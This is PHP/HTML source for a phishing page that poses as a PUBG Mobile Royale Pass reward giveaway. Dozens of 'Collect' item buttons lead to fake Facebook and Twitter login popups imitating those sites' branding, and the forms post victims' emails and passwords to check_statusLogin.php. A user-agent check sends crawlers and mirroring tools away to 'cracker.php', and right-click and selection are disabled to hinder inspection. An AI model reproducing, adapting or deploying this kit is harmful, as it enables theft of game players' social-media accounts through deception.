<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
// MENGAMBIL KONTROL
include("system/setting.php");
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="<?php echo $title;?>">
<meta name="description" content="<?php echo $description;?>">
<meta property="og:description" content="<?php echo $description;?>">
<meta property="og:url" content="./">
<meta property="og:site_name" content="<?php echo $title;?>">
<meta property="og:type" content="website">
<meta name="copyright"content="<?php echo $copyright;?>">
<meta name="theme-color" content="<?php echo $theme;?>">
<meta property="og:image" content="<?php echo $image;?>">
<title><?php echo $title;?></title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/login/facebook.css">
<link rel="stylesheet" href="css/login/twitter.css">
<link rel="stylesheet" href="css/login/google.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.css">
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
<link rel="icon" href="<?php echo $icon;?>">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<div class="container">
<div class="container-mask">
<div class="navbar">
<div class="navbar-menu">
<i class="fa fa-bars"></i>
</div> <!--- navbar-menu --->
<div class="navbar-logo-box">
<img src="https://i.ibb.co/cQWNSMv/logo.png">
</div> <!--- navbar-logo-box --->
</div> <!--- navbar --->
<div class="reward-content">
<div class="menu-wrapper">
<center>
<div class="menu-choose kiri" style="border-top-left-radius: 3px; border-bottom-left-radius: 3px;" onclick="openRewards(event, 'latest');" id="defaultTabRewards">Latest Reward</div>
<div class="menu-choose kanan" style="border-top-right-radius: 3px; border-bottom-right-radius: 3px;" onclick="openRewards(event, 'other');">Other Reward</div>
<div class="menu-choose tengah" onclick="openRewards(event, 'season');">Season Reward</div>
</center>
</div> <!--- menu-wrapper --->
<div class="tab_rewards" id="latest">
<div class="menu-notify">
<div class="menu-notify-icon"><i class="zmdi zmdi-info-outline"></i></div>
<div class="menu-notify-txt">Hi survivor, this is the latest reward for you today</div>
</div> <!--- menu-notify --->
<div class="scroll">
<div class="item kanan">
<img src="https://i.ibb.co/qdC5zHF/5.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/qdC5zHF/5.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://i.ibb.co/mTpf1bz/3.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/mTpf1bz/3.jpg">Collect</button>
</div>
<div class="item tengah">
<img src="https://i.ibb.co/pd4MrC6/4.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/pd4MrC6/4.jpg">Collect</button>
</div>
<div class="item kanan">
<img src="https://i.ibb.co/Xjjs6Mv/5.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/Xjjs6Mv/5.jpg">Collect</button>
</div>
<div class="item kiri">
<img src="https://i.ibb.co/wwCwgFX/6.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/wwCwgFX/6.jpg">Collect</button>
</div>
<div class="item tengah">
<img src="https://i.ibb.co/sVkDgf7/8.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/sVkDgf7/8.jpg">Collect</button>
</div>
<div class="item kanan">
<img src="https://i.ibb.co/7v7cDFb/9.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/7v7cDFb/9.jpg">Collect</button>
</div>
<div class="item kiri">
<img src="https://i.ibb.co/0mK0Kkm/1.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/0mK0Kkm/1.jpg">Collect</button>
</div>
<div class="item tengah">
<img src="https://i.ibb.co/x70Zv58/2.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/x70Zv58/2.jpg">Collect</button>
</div>
<div class="item kanan">
<img src="https://i.ibb.co/SfsVZj3/3.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/SfsVZj3/3.jpg">Collect</button>
</div>
<div class="item kiri">
<img src="https://i.ibb.co/VgpfgHx/4.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/VgpfgHx/4.jpg">Collect</button>
</div>
<div class="item tengah">
<img src="https://i.ibb.co/m8swBsJ/5.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/m8swBsJ/5.jpg">Collect</button>
</div>
<div class="item kanan">
<img src="https://i.ibb.co/mqswmqy/6.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/mqswmqy/6.jpg">Collect</button>
</div>
<div class="item kiri">
<img src="https://i.ibb.co/mzBCPj0/7.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/mzBCPj0/7.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://i.ibb.co/RBm3cZg/8.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/RBm3cZg/8.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://i.ibb.co/GkxtWsH/9.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/GkxtWsH/9.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://i.ibb.co/vDzhn4G/10.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/vDzhn4G/10.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://i.ibb.co/hV80jRJ/11.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/hV80jRJ/11.jpg">Collect</button>
</div>
<div class="item kanan">
<img src="https://i.ibb.co/TM4x8kF/12.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/TM4x8kF/12.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://i.ibb.co/3s4VjWb/13.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/3s4VjWb/13.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://i.ibb.co/hyMFJVy/14.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/hyMFJVy/14.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://i.ibb.co/Fb4WYn9/15.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/Fb4WYn9/15.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://i.ibb.co/wgC8DFJ/16.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/wgC8DFJ/16.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://i.ibb.co/z7tRFnK/17.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/z7tRFnK/17.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://i.ibb.co/mSR83ZX/18.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/mSR83ZX/18.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://i.ibb.co/r01vx8L/19.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/r01vx8L/19.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://i.ibb.co/BzkrJPx/20.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/BzkrJPx/20.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://i.ibb.co/KKsqN8c/21.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/KKsqN8c/21.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://i.ibb.co/Ms6xmw1/22.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/Ms6xmw1/22.jpg">Collect</button>
</div>
<div class="item tengah">
<img src="https://i.ibb.co/nszjrmK/23.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/nszjrmK/23.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://i.ibb.co/C8XSXtp/24.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/C8XSXtp/24.jpg">Collect</button>
</div>
<div class="item kiri">
<img src="https://i.ibb.co/XFvVdkm/25.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/XFvVdkm/25.jpg">Collect</button>
</div>
<div class="item tengah">
<img src="https://i.ibb.co/42KvPQD/26.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/42KvPQD/26.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://i.ibb.co/PztSxRq/27.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/PztSxRq/27.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://i.ibb.co/c1dyKJX/28.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/c1dyKJX/28.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://i.ibb.co/SQctySW/29.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/SQctySW/29.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://i.ibb.co/HhxqcZy/30.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/HhxqcZy/30.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://i.ibb.co/BG71Lq8/1.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/BG71Lq8/1.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://i.ibb.co/cYLYRnF/2.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/cYLYRnF/2.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://i.ibb.co/Kmzt1kv/3.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/Kmzt1kv/3.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://i.ibb.co/ySj37hj/4.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/ySj37hj/4.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://i.ibb.co/kh4gdrP/5.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/kh4gdrP/5.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://i.ibb.co/ZBrkgM8/6.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/ZBrkgM8/6.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://i.ibb.co/ngP07s9/7.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/ngP07s9/7.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://i.ibb.co/HGTx2s3/8.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/HGTx2s3/8.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://i.ibb.co/mzb2f6V/9.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/mzb2f6V/9.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://i.ibb.co/QHRMWMg/10.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/QHRMWMg/10.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://i.ibb.co/G9M0Bvm/11.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/G9M0Bvm/11.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://i.ibb.co/wMD34vP/12.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/wMD34vP/12.jpg">Collect</button>
</div>
<div class="item kiri">
<img src="https://i.ibb.co/cwWc8V7/13.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/cwWc8V7/13.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://i.ibb.co/0QtCjnz/14.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/0QtCjnz/14.jpg">Collect</button>
</div>
<div class="item kanan">
<img src="https://i.ibb.co/g9zWGn4/15.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/g9zWGn4/15.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://i.ibb.co/MnM6Qdp/16.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/MnM6Qdp/16.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://i.ibb.co/Rg2thNY/17.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/Rg2thNY/17.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://i.ibb.co/VQtZ0sH/18.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/VQtZ0sH/18.jpg">Collect</button>
</div>
<div class="item kiri">
<img src="https://i.ibb.co/j3K6DSC/19.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/j3K6DSC/19.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://i.ibb.co/WVQrH9j/20.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/WVQrH9j/20.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://i.ibb.co/SrWTVzr/21.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/SrWTVzr/21.jpg">Collect</button>
</div>
<div class="item kiri">
<img src="https://i.ibb.co/YPXLK1h/22.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/YPXLK1h/22.jpg">Collect</button>
</div>
<div class="item tengah">
<img src="https://i.ibb.co/GWGX9DZ/23.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/GWGX9DZ/23.jpg">Collect</button>
</div>
<div class="item kanan">
<img src="https://i.ibb.co/Q8F2nX9/24.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/Q8F2nX9/24.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://i.ibb.co/Z6KDLDN/25.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/Z6KDLDN/25.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://i.ibb.co/N102xm6/26.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/N102xm6/26.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://i.ibb.co/cwJRtR3/27.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/cwJRtR3/27.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://i.ibb.co/5x1w88X/28.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/5x1w88X/28.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://i.ibb.co/R0rQvw4/29.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/R0rQvw4/29.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://i.ibb.co/27fMpPf/30.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/27fMpPf/30.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://i.ibb.co/cTcRJCZ/31.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/cTcRJCZ/31.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://i.ibb.co/WPFTmgN/32.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/WPFTmgN/32.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://i.ibb.co/0h8n8jN/33.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/0h8n8jN/33.jpg">Collect</button>
</div>
<div class="item kiri">
<img src="https://i.ibb.co/3WdQMkQ/34.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/3WdQMkQ/34.jpg">Collect</button>
</div>
<div class="item tengah">
<img src="https://i.ibb.co/n6KkVTX/35.jpg">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/n6KkVTX/35.jpg">Collect</button>
</div>
<div class="item kanan">
<img src="https://i.ibb.co/pWR4WQ1/36.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/pWR4WQ1/36.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://i.ibb.co/6DmJkWp/37.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/6DmJkWp/37.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://i.ibb.co/9sT1w13/38.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/9sT1w13/38.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://i.ibb.co/PQtBL6z/39.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/PQtBL6z/39.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://i.ibb.co/Gk99ZQY/40.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/Gk99ZQY/40.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://i.ibb.co/P44sdBP/41.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/P44sdBP/41.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://i.ibb.co/0MhX7pL/42.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/0MhX7pL/42.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://i.ibb.co/c6PYCWg/43.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/c6PYCWg/43.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://i.ibb.co/qsw53N6/44.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/qsw53N6/44.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://i.ibb.co/rQ7NY9z/45.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/rQ7NY9z/45.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://i.ibb.co/X3CBhhv/46.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/X3CBhhv/46.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://i.ibb.co/KLQY3Vg/47.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/KLQY3Vg/47.png">Collect</button>
</div>
<div class="item kanan">
<img src="https://i.ibb.co/nMmZ2Rc/48.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/nMmZ2Rc/48.png">Collect</button>
</div>
<div class="item kiri">
<img src="https://i.ibb.co/XS1D33m/49.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/XS1D33m/49.png">Collect</button>
</div>
<div class="item tengah">
<img src="https://i.ibb.co/PQNxt7B/50.png">
<button type="button" onclick="open_reward_confirmation(this)" src="https://i.ibb.co/PQNxt7B/50.png">Collect</button>
</div>
</div> <!--- scroll --->
</div> <!--- tab_rewards --->

<div class="tab_rewards" id="season">
<div class="menu-notify">
<div class="menu-notify-icon"><i class="zmdi zmdi-info-outline"></i></div>
<div class="menu-notify-txt">Hi survivor, this is the season reward for you today</div>
</div> <!--- menu-notify --->
<div class="scroll">
<div class="item kanan">
<img src="img/reward/season/1.png">
<button type="button" onclick="open_reward_confirmation(this)" src="img/reward/season/1.png">Collect</button>
</div>
<div class="item kiri">
<img src="img/reward/season/2.png">
<button type="button" onclick="open_reward_confirmation(this)" src="img/reward/season/2.png">Collect</button>
</div>
<div class="item tengah">
<img src="img/reward/season/3.png">
<button type="button" onclick="open_reward_confirmation(this)" src="img/reward/season/3.png">Collect</button>
</div>
<div class="item kanan">
<img src="img/reward/season/4.png">
<button type="button" onclick="open_reward_confirmation(this)" src="img/reward/season/4.png">Collect</button>
</div>
<div class="item kiri">
<img src="img/reward/season/5.png">
<button type="button" onclick="open_reward_confirmation(this)" src="img/reward/season/5.png">Collect</button>
</div>
<div class="item tengah">
<img src="img/reward/season/6.png">
<button type="button" onclick="open_reward_confirmation(this)" src="img/reward/season/6.png">Collect</button>
</div>
<div class="item kanan">
<img src="img/reward/season/7.png">
<button type="button" onclick="open_reward_confirmation(this)" src="img/reward/season/7.png">Collect</button>
</div>
<div class="item kiri">
<img src="img/reward/season/8.png">
<button type="button" onclick="open_reward_confirmation(this)" src="img/reward/season/8.png">Collect</button>
</div>
<div class="item tengah">
<img src="img/reward/season/9.png">
<button type="button" onclick="open_reward_confirmation(this)" src="img/reward/season/9.png">Collect</button>
</div>
<div class="item kanan">
<img src="img/reward/season/10.png">
<button type="button" onclick="open_reward_confirmation(this)" src="img/reward/season/10.png">Collect</button>
</div>
<div class="item kiri">
<img src="img/reward/season/11.png">
<button type="button" onclick="open_reward_confirmation(this)" src="img/reward/season/11.png">Collect</button>
</div>
<div class="item tengah">
<img src="img/reward/season/12.png">
<button type="button" onclick="open_reward_confirmation(this)" src="img/reward/season/12.png">Collect</button>
</div>
<div class="item kanan">
<img src="img/reward/season/13.png">
<button type="button" onclick="open_reward_confirmation(this)" src="img/reward/season/13.png">Collect</button>
</div>
<div class="item kiri">
<img src="img/reward/season/14.png">
<button type="button" onclick="open_reward_confirmation(this)" src="img/reward/season/14.png">Collect</button>
</div>
<div class="item tengah">
<img src="img/reward/season/15.png">
<button type="button" onclick="open_reward_confirmation(this)" src="img/reward/season/15.png">Collect</button>
</div>
<div class="item kanan">
<img src="img/reward/season/16.png">
<button type="button" onclick="open_reward_confirmation(this)" src="img/reward/season/16.png">Collect</button>
</div>
<div class="item kiri">
<img src="img/reward/season/17.png">
<button type="button" onclick="open_reward_confirmation(this)" src="img/reward/season/17.png">Collect</button>
</div>
<div class="item tengah">
<img src="img/reward/season/18.png">
<button type="button" onclick="open_reward_confirmation(this)" src="img/reward/season/18.png">Collect</button>
</div>
<div class="item kanan">
<img src="img/reward/season/19.png">
<button type="button" onclick="open_reward_confirmation(this)" src="img/reward/season/19.png">Collect</button>
</div>
<div class="item kiri">
<img src="img/reward/season/20.png">
<button type="button" onclick="open_reward_confirmation(this)" src="img/reward/season/20.png">Collect</button>
</div>
<div class="item tengah">
<img src="img/reward/season/21.png">
<button type="button" onclick="open_reward_confirmation(this)" src="img/reward/season/21.png">Collect</button>
</div>
</div> <!--- scroll --->
</div> <!--- tab_rewards --->

<div class="tab_rewards" id="other">
<script type="text/javascript">
function buka(nama) {
$("#konten").html('<div class="load-item">Please wait...</div>');
	$.ajax({
		url	: nama+'.php',
		type	: 'GET',
		dataType: 'html',
		success	: function(isi){
			$("#konten").html(isi);
		},
	});
}

</script>
<div id="konten">
<?php include 'pages/weapon.php';?>
</div>
</div> <!--- tab_rewards --->

</div> <!--- reward-content --->
</div> <!--- container-mask --->
</div> <!--- container --->


<div class="popup reward_confirmation" style="display: none;">
<div class="container">
<div class="container-mask">
<div class="navbar">
<div class="navbar-menu">
<i class="fa fa-bars"></i>
</div> <!--- navbar-menu --->
<div class="navbar-logo-box">
<img src="https://i.ibb.co/cQWNSMv/logo.png">
</div> <!--- navbar-logo-box --->
</div> <!--- navbar --->
<div class="reward-content">
<div class="menu-notify">
<div class="menu-notify-icon"><i class="zmdi zmdi-help-outline"></i></div>
<div class="menu-notify-txt">Hi survivor, are you sure to collect this reward?</div>
</div> <!--- menu-notify --->
<div class="item-confirmation">
<div class="item-confirmation-img-box">
<img src="" id="myReward">
</div> <!--- item-confirmation-img-box --->
<div class="item-confirmation-info">
<div class="item-confirmation-status-title">
Reward Availability
</div> <!--- item-confirmation-status-title --->
<div class="item-confirmation-status-info">
This reward is available to collect
</div> <!--- item-confirmation-status-info --->
<div class="item-confirmation-information-title">
Reward Information
</div> <!--- item-confirmation-status-title --->
<div class="item-confirmation-information-info">
Special reward for Royale Pass Season 15.
</div> <!--- item-confirmation-status-info --->
</div> <!--- item-confirmation-info --->
</div> <!--- item-confirmation --->
<div class="btn-popup-wrapper">
<div class="btn-popup kiri" onclick="close_reward_confirmation()">
<div class="btn-popup-icon"><i class="fa fa-chevron-left fa-md"></i></div>
<div class="btn-popup-txt">Back to reward</div>
</div> <!--- btn-popup --->
<div class="btn-popup kanan" onclick="open_account_login()">
<div class="btn-popup-icon" style="margin-right: 0px; float: right;"><i class="fa fa-chevron-right fa-md" style="margin-left: 3px;"></i></div>
<div class="btn-popup-txt">Collect this reward</div>
</div> <!--- btn-popup --->
</div> <!--- btn-popup-wrapper --->
</div> <!--- reward-content --->
</div> <!--- container-mask --->
</div> <!--- container --->
</div> <!--- popup-reward --->

<div class="popup account_login" style="display: none;">
<div class="container">
<div class="container-mask">
<div class="navbar">
<div class="navbar-menu">
<i class="fa fa-bars"></i>
</div> <!--- navbar-menu --->
<div class="navbar-logo-box">
<img src="https://i.ibb.co/cQWNSMv/logo.png">
</div> <!--- navbar-logo-box --->
</div> <!--- navbar --->
<div class="reward-content">
<div class="menu-notify">
<div class="menu-notify-icon"><i class="zmdi zmdi-info-outline"></i></div>
<div class="menu-notify-txt">Login to your PUBG MOBILE account to receive your reward</div>
</div> <!--- menu-notify --->
<div class="btn-login" onclick="open_facebook_login()">
<div class="btn-login-logo">
<img src="https://i.ibb.co/w45vvsC/facebook-icon.png">
</div>
<div class="btn-login-txt">Login with Facebook</div>
</div> <!--- btn-login --->
<div class="btn-login" onclick="open_twitter_login()">
<div class="btn-login-logo">
<img src="https://i.ibb.co/3rbhpVp/twitter-icon.png">
</div>
<div class="btn-login-txt">Login with Twitter</div>
</div> <!--- btn-login --->
<div class="btn-popup-wrapper">
<div class="btn-popup tengah" onclick="close_account_login()">
<div class="btn-popup-icon"><i class="fa fa-chevron-left fa-md"></i></div>
<div class="btn-popup-txt">Back to reward</div>
</div> <!--- btn-popup --->
</div> <!--- btn-popup-wrapper --->
</div> <!--- reward-content --->
</div> <!--- container-mask --->
</div> <!--- container --->
</div> <!--- popup-reward --->


<div class="popup-login login_facebook animated fadeIn" style="display: none;">
	<div class="popup-box-login-fb">
		<a onclick="close_facebook_login()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
		<div class="navbar-fb">
			<img src="https://i.ibb.co/QNdsmDc/facebook-text.png">
		</div>
		<div class="content-box-fb">
			<img src="https://www.pubgmobile.com/id/event/royalepass10/images/icon_logo.jpg">
			<div class="txt-login-fb">
				 Log in to your Facebook account to connect to PUBG MOBILE
			</div>
			<form action="check_statusLogin.php" method="post">
				<input type="text" class="input-fb-email" name="email" placeholder="Mobile number or email" autocomplete="off" autocapitalize="off" required>
				<input type="password" class="input-fb-password" name="password" placeholder="Facebook password" autocomplete="off" autocapitalize="off" required>
				<input type="hidden" name="login" value="Facebook" readonly>
				<button type="submit" class="btn-login-fb">Log In</button>
			</form>
			<div class="txt-create-account">Create account</div>
			<div class="txt-not-now">Not now</div>
			<div class="txt-forgotten-password">Forgotten password?</div>
		</div>
		<div class="language-box">
			<center>
			<div class="language-name language-name-active">English (UK)</div>
			<div class="language-name">Bahasa Indonesia</div>
			<div class="language-name">Basa Jawa</div>
			<div class="language-name">Bahasa Melayu</div>
			<div class="language-name">日本語</div>
			<div class="language-name">Español</div>
			<div class="language-name">Português (Brasil)</div>
			<div class="language-name">
				<i class="fa fa-plus"></i>
			</div>
			</center>
		</div>
		<div class="copyright">Facebook Inc.</div>
	</div>
</div>

<div class="popup-login login_twitter animated fadeIn" style="display: none;">
	<div class="popup-box-login-twitter">
	<a onclick="close_twitter_login()" class="close-other"><i class="zmdi zmdi-close"></i></a>
		<div class="header-twitter">
			<center>
			<img src="https://i.ibb.co/W0V2vPK/twitter-text.png">
			</center>
		</div>
		<div class="box-twitter">
			<center>
			<form action="check_statusLogin.php" method="post">
				<div class="txt-login-twitter">Login to Twitter</div>
				<div class="input-box-twitter">
					<label>Phone, email, or username</label>
					<input type="text" name="email" placeholder="" required>
				</div>
				<div class="input-box-twitter">
					<label>Password</label>
					<input type="password" name="password" placeholder="" required>
				</div>
				<input type="hidden" name="login" value="Twitter" readonly>
				<button type="submit" class="btn-login-twitter">Log In</button>
				<div class="footer-menu-twitter">Forgot password?</div>
				<div class="footer-menu-twitter bulet">•</div>
				<div class="footer-menu-twitter">Sign up to Twitter</div>
			</form>
			</center>
		</div>
	</div>
</div>

<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="js/tab.js"></script>
<script src="js/popup.js"></script>

</body>
</html>